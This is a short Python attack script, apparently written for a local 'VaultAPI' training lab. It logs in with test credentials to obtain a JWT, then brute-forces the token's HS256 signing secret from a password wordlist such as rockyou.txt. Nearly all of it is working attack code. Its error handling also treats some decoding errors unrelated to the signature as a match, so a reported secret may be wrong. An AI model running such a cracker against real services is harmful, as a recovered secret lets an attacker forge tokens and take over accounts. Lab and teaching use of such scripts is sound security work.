#!/usr/bin/env python3
"""
JWT HMAC secret cracker — for the VaultAPI lab.
Grabs a token from /login, then tries wordlist entries as the HS256 secret.
"""
import sys
import requests
import jwt  # PyJWT

BASE = "http://localhost:8083"  # adjust to your lab's host/port

def get_token():
    r = requests.post(f"{BASE}/login", json={"username": "alice", "password": "password123"})
    r.raise_for_status()
    return r.json()["token"]

def crack(token, wordlist_path):
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                return secret  # verification succeeded → correct secret
            except jwt.InvalidSignatureError:
                continue  # wrong secret, keep going
            except jwt.PyJWTError:
                # e.g. expired/other claim issue, but signature matched
                return secret
    return None

if __name__ == "__main__":
    wordlist = sys.argv[1] if len(sys.argv) > 1 else "rockyou.txt"
    token = get_token()
    print(f"[+] Token: {token}")
    print(f"[*] Trying secrets from {wordlist} ...")
    found = secret = crack(token, wordlist)
    if found:
        print(f"[+] SECRET FOUND: {found}")
    else:
        print("[-] Not found. Try a bigger wordlist.")